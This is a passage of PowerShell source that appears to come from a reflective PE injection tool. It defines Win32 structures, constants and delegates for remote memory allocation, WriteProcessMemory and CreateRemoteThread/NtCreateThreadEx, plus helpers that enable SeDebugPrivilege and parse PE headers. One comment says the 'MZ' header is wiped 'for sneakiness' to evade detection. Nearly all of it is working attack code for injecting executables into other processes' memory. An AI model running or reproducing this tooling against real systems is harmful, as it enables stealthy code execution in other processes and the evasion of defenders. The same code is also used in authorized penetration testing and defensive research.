        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
    
        $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',
[type[]]('System.Runtime.InteropServices.HandleRef', 'System.String'))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
